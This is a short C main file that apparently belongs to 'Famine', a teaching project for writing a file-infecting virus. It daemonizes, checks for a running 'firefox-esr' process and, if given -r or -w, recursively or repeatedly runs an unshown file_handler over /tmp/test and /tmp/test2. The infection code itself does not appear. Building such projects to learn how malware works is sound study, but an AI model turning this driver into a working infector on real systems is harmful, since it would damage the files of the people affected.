#include <ft_famine.h>


int main(int argc, char **argv)
{
    struct stat stats;
    char        *path_test  = "/tmp/test";
    char        *path_test2 = "/tmp/test2";
    bool        is_rec = false;
    bool        watch = false;
    int         ret = 0;

    daemonize();

    if(argc > 1 && !ft_strcmp(argv[1], "-r"))
        is_rec = true;
    if(argc > 1 && !ft_strcmp(argv[1], "-w"))
        watch = true;
    do
    {
        if(check_process_by_name("firefox-esr"))
        {
            if(stat(path_test, &stats) == 0 && S_ISDIR(stats.st_mode))
            {
                ret = file_handler(path_test, is_rec);
            }
            if(stat(path_test2, &stats) == 0 && S_ISDIR(stats.st_mode))
            {
                ret = file_handler(path_test2, is_rec);
            }
        }
        sleep(5);
    } while(watch);
    return ret;
}